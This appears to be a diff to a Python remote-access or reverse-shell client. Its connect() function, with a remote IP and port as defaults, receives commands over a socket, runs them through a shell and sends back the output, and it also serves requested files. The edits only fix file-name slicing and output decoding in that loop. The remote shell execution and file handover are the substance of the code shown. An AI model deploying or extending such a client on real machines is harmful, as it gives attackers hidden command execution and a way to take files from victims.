@@ -517,7 +517,7 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     print_info("Received GET")
                     if OUTPUT_FILE:
                         log_line("Received GET")
-                file_name = data[:-5:]
+                file_name = data[:-5:][6::]
                 if path.exists(file_name):
                     if VERBOSE:
                         print_info("File Found! :) --> {}".format(file_name))
@@ -584,15 +584,15 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     try:
                         output = subprocess.run(data, timeout=10, encoding="utf8", shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                         if output.stderr != b"":
-                            send_data(conn, output.stderr.decode('utf-8')) # send back the errors
+                            send_data(conn, output.stderr) # send back the errors
                         elif output.stdout == b"":
                             send_data(conn, "ERROR/EMPTY RESPONSE --> {}".format(data))
                         else:
                             try:
-                                send_data(conn, output.stdout.decode('utf-8')) # send back the result
+                                send_data(conn, output.stdout) # send back the result
                                 #send_data(conn, output.stdout)#.decode('utf-8')) # send back the result
                             except UnicodeDecodeError:
-                                send_data(conn, output.stdout.decode('cp1251')) # send back the result
+                                send_data(conn, output.stdout) # send back the result
                                 if OUTPUT_FILE:
                                     log_line("UNICODE ERROR")
                     except subprocess.TimeoutExpired:
